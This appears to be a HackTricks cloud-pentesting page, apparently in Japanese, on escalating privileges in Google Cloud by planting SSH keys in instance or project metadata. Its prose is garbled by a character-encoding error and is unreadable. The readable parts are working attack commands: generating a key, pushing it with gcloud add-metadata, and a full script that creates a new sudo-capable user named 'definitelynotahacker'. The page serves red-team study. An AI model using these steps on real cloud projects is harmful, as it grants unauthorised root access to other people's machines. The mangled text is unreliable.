# GCP - Add Custom SSH Metadata

## GCP - Add Custom SSH Metadata

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ã¯ã€**æ”»æ’ƒè€…ãŒå¿…è¦ãªæ¨©é™ã‚’å¾—ãŸå ´åˆã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚

#### **ã‚«ã‚¹ã‚¿ãƒ ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã¸ã®SSHã‚­ãƒ¼ã®çµ„ã¿è¾¼ã¿**

GCPã§ã¯ã€**Linuxã‚·ã‚¹ãƒ†ãƒ **ã¯ã—ã°ã—ã°[Google Compute Engineç”¨ã®Python Linux Guest Environment](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ã‹ã‚‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã®é‡è¦ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ã€**èªå¯ã•ã‚ŒãŸSSHå…¬é–‹éµã®æ›´æ–°**ã®ãŸã‚ã«ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’**å®šæœŸçš„ã«ãƒã‚§ãƒƒã‚¯**ã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚ŒãŸ[ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒ‡ãƒ¼ãƒ¢ãƒ³](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ã§ã™ã€‚

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ãŒã‚«ã‚¹ã‚¿ãƒ ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆã€ãƒ‡ãƒ¼ãƒ¢ãƒ³ãŒæ–°ã—ã„å…¬é–‹éµã‚’è¦‹ã¤ã‘ã‚‹ã‚ˆã†ã«ã—ã€ãã‚ŒãŒå‡¦ç†ã•ã‚Œã¦**ãƒ­ãƒ¼ã‚«ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«çµ±åˆã•ã‚Œã‚‹**ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã“ã®éµã¯ã€**æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®`~/.ssh/authorized_keys`ãƒ•ã‚¡ã‚¤ãƒ«ã«è¿½åŠ ã•ã‚Œã‚‹ã‹ã€éµã®å½¢å¼ã«å¿œã˜ã¦`sudo`æ¨©é™ã‚’æŒã¤æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä½œæˆã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚æ”»æ’ƒè€…ã¯ãƒ›ã‚¹ãƒˆã‚’ä¾µå®³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### **æ—¢å­˜ã®ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

1. **ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ä¸Šã®æ—¢å­˜ã®SSHã‚­ãƒ¼ã‚’èª¿æŸ»ã™ã‚‹:**
*   ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¨ãã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’è¨˜è¿°ã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã€æ—¢å­˜ã®SSHã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã¾ã™ã€‚å‡ºåŠ›ã®é–¢é€£ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¯`metadata`ã®ä¸‹ã€ç‰¹ã«`ssh-keys`ã‚­ãƒ¼ã®ä¸‹ã«ã‚ã‚Šã¾ã™ã€‚

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* SSHã‚­ãƒ¼ã®å½¢å¼ã«æ³¨æ„ã—ã¦ãã ã•ã„: ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯éµã®å‰ã«ã‚ã‚Šã€ã‚³ãƒ­ãƒ³ã§åŒºåˆ‡ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
2. **SSHã‚­ãƒ¼ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ç”¨ã®ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’æº–å‚™ã™ã‚‹:**
* ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãã‚Œã«å¯¾å¿œã™ã‚‹SSHã‚­ãƒ¼ã®è©³ç´°ã‚’`meta.txt`ã¨ã„ã†åå‰ã®ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€æ–°ã—ã„ã‚­ãƒ¼ã‚’è¿½åŠ ã—ãªãŒã‚‰æ—¢å­˜ã®ã‚­ãƒ¼ã‚’ä¿æŒã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚
3. **ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆã“ã®ä¾‹ã§ã¯`alice`ï¼‰ã®ãŸã‚ã«æ–°ã—ã„SSHã‚­ãƒ¼ã‚’ç”Ÿæˆã™ã‚‹:**
*   `ssh-keygen`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦æ–°ã—ã„SSHã‚­ãƒ¼ã‚’ç”Ÿæˆã—ã€ã‚³ãƒ¡ãƒ³ãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ï¼ˆ`-C`ï¼‰ãŒã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ä¸€è‡´ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* æ–°ã—ã„å…¬é–‹éµã‚’`meta.txt`ã«è¿½åŠ ã—ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«è¦‹ã‚‰ã‚Œã‚‹å½¢å¼ã‚’æ¨¡å€£ã—ã¾ã™ã€‚
4. **ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®SSHã‚­ãƒ¼ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’æ›´æ–°ã™ã‚‹:**
*   `gcloud compute instances add-metadata`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«æ›´æ–°ã•ã‚ŒãŸSSHã‚­ãƒ¼ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’é©ç”¨ã—ã¾ã™ã€‚

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **æ–°ã—ã„SSHã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹:**
*   æ–°ã—ã„ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦SSHã§ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«æ¥ç¶šã—ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆã“ã®ä¾‹ã§ã¯`alice`ï¼‰ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã‚·ã‚§ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **æ–°ã—ã„ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã€SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

èˆˆå‘³æ·±ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€`sudo`æ¨©é™ã‚’ä¸ãˆã‚‰ã‚Œã‚‹æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§ã®SSHã‚­ãƒ¼ <a href="#sshing-around" id="sshing-around"></a>

**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§SSHã‚­ãƒ¼ã‚’é©ç”¨ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒå†…ã®è¤‡æ•°ã®ä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰ã¸ã®SSHã‚¢ã‚¯ã‚»ã‚¹ã‚’æ‹¡å¤§ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚** ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã«ã‚ˆã‚Šã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®æ˜ç¤ºçš„ã«ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå…¨ä½“ã®SSHã‚­ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¦ã„ãªã„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¸ã®SSHã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ä»¥ä¸‹ã¯è¦ç´„ã‚¬ã‚¤ãƒ‰ã§ã™ï¼š

1. **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§SSHã‚­ãƒ¼ã‚’é©ç”¨ã™ã‚‹:**
*   `gcloud compute project-info add-metadata`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€`meta.txt`ã‹ã‚‰ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«SSHã‚­ãƒ¼ã‚’è¿½åŠ ã—ã¾ã™ã€‚ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚Šã€VMãŒã€Œãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå…¨ä½“ã®SSHã‚­ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã¦ã„ãªã„é™ã‚Šã€SSHã‚­ãƒ¼ãŒãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ã™ã¹ã¦ã®VMã§èªè­˜ã•ã‚Œã‚‹ã“ã¨ãŒä¿è¨¼ã•ã‚Œã¾ã™ã€‚

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå…¨ä½“ã®ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«SSHæ¥ç¶šã™ã‚‹:**
* ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå…¨ä½“ã®SSHã‚­ãƒ¼ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ä»»æ„ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«SSHæ¥ç¶šã§ãã¾ã™ã€‚ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå…¨ä½“ã®ã‚­ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¦ã„ãªã„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯SSHã‚­ãƒ¼ã‚’å—ã‘å…¥ã‚Œã€ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ã€‚
* ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«SSHæ¥ç¶šã™ã‚‹ç›´æ¥çš„ãªæ–¹æ³•ã¯ã€`gcloud compute ssh [INSTANCE]`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§è¨­å®šã•ã‚ŒãŸSSHã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
